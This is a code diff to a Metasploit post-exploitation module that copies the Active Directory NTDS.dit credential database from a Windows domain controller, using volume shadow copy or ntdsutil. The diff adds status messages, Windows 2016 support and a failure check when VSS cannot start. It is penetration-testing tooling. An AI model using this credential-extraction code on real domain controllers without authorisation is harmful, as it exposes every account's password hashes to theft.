@@ -31,6 +31,7 @@ class MetasploitModule < Msf::Post
 
   def run
     if preconditions_met?
+      print_status "Pre-conditions met, attempting to copy NTDS.dit"
       ntds_file = copy_database_file
       unless ntds_file.nil?
         file_stat = client.fs.file.stat(ntds_file)
@@ -57,15 +58,15 @@ class MetasploitModule < Msf::Post
 
   def copy_database_file
     database_file_path = nil
-    if start_vss
-      case  sysinfo["OS"]
-        when /2003| \.NET/
-          database_file_path = vss_method
-        when /2008|2012/
-          database_file_path = ntdsutil_method
-        else
-          print_error "This version of Windows is unsupported"
-      end
+    case  sysinfo["OS"]
+      when /2003| \.NET/
+        print_status "Using Volume Shadow Copy Method"
+        database_file_path = vss_method
+      when /2008|2012|2016/
+        print_status "Using NTDSUTIL method"
+        database_file_path = ntdsutil_method
+      else
+        print_error "This version of Windows is unsupported"
     end
     database_file_path
   end
@@ -99,11 +100,15 @@ class MetasploitModule < Msf::Post
 
 
   def preconditions_met?
-    unless is_admin?
+    if is_admin?
+      print_status "Session has Admin privs"
+    else
       print_error "This module requires Admin privs to run"
       return false
     end
-    unless is_domain_controller?
+    if is_domain_controller?
+      print_status "Sessions is on a Domain Controller"
+    else
       print_error "This does not appear to be an AD Domain Controller"
       return false
     end
@@ -144,6 +149,9 @@ class MetasploitModule < Msf::Post
   end
 
   def vss_method
+    unless start_vss
+      fail_with(Failure::NoAccess, "Unable to start VSS service")
+    end
     location = ntds_location.dup
     volume = location.slice!(0,3)
     id = create_shadowcopy("#{volume}")
